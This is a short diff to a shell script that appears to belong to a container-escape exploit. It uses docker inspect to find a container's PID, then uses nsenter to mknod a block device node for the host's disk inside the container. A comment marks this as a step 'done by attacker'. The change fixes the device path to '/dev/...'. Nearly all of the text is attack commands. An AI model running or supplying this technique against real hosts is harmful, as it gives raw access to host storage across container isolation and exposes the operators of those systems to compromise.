@@ -9,7 +9,7 @@ docker inspect --format {{.State.Pid}} ${container_id} > PID
 container_pid=$(cat PID)
 major=$(cat major_num)
 minor=$(cat minor_num)
-dev=$(cat sdev_of_fs)
+dev="/dev/$(cat sdev_of_fs)"
 
 #Done by attacker inside host
 nsenter --target ${container_pid} --mount --pid mknod --mode 0600 ${dev} b ${major} ${minor}
